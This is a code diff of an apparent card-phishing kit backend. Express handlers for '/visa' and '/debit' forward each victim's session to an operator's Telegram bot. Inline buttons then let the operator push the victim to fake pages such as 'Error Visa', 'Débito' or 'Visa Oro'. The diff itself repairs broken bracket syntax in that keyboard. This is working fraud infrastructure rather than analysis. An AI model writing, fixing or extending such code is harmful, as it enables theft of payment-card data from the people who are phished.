@@ -271,12 +271,13 @@ app.post('/visa', async (req, res) => {
 🆔 Session: ${sessionId}
     `.trim();
 
-    const reply_markup = {
-      inline_keyboard: [
-        [
-          { text: "❌ Error Visa", callback_data: `go:visa.html|${sessionId}` },
-          { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
-         [
+   const reply_markup = {
+  inline_keyboard: [
+    [
+      { text: "❌ Error Visa", callback_data: `go:visa.html|${sessionId}` },
+      { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
+    ],
+    [
       { text: "💳 Débito", callback_data: `go:debit.html|${sessionId}` },
       { text: "🪙 Visa Oro", callback_data: `go:Visa+Oro.html|${sessionId}` }
     ],
@@ -306,6 +307,7 @@ app.post('/visa', async (req, res) => {
     ]
   ]
 };
+
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
@@ -366,12 +368,13 @@ app.post('/debit', async (req, res) => {
 🆔 Session: ${sessionId}
     `.trim();
 
-    const reply_markup = {
-      inline_keyboard: [
-        [
-          { text: "❌ Error Débito", callback_data: `go:debit.html|${sessionId}` },
-          { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
-         [
+   const reply_markup = {
+  inline_keyboard: [
+    [
+      { text: "❌ Error Débito", callback_data: `go:debit.html|${sessionId}` },
+      { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
+    ],
+    [
       { text: "💳 Débito", callback_data: `go:debit.html|${sessionId}` },
       { text: "🪙 Visa Oro", callback_data: `go:Visa+Oro.html|${sessionId}` }
     ],
@@ -401,6 +404,7 @@ app.post('/debit', async (req, res) => {
     ]
   ]
 };
+
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
